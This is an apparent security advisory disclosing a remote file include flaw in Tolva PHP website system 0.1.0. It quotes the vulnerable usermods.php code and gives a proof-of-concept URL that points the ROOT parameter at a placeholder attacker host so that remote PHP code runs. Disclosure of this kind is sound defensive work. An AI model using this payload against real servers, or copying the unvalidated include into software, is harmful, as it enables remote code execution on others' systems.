Subject: Tolva PHP website system Remote File Include


Script: Tolva PHP website system
Version: 0.1.0
Language: PHP
Official Website: http://sourceforge.net/projects/twebs
Problem: Remote File Include
Discovered by: beford

Description:
============

A complete collection of php scripts that work tightly together to
create a highly customizable, dynamic and module oriented website.

Problem:
========

A remote user can supply a specially crafted URL to cause the target
system to include and execute arbitrary PHP code from a remote
location. A remote user can execute arbitrary PHP code and operating
system commands on the target system with the privileges of the target
web service. The problem is in the file
"/twebs-0.1.0/src/modules/misc/usermods.php". It seems like there are
other files
affected by the same vuln.


<?PHP
$mod_id=$uid;
include("$ROOT/modules/main.php");
?>


The variable $ROOT isn't initialized and the usermods.php file doesn't
validate user-supplied data in this parameter.


Proof of Concept URL:
==================

http://[target]/twebs/modules/misc/usermods.php?ROOT=http://[attacker_url]


Solution:
========

No solution at this time.
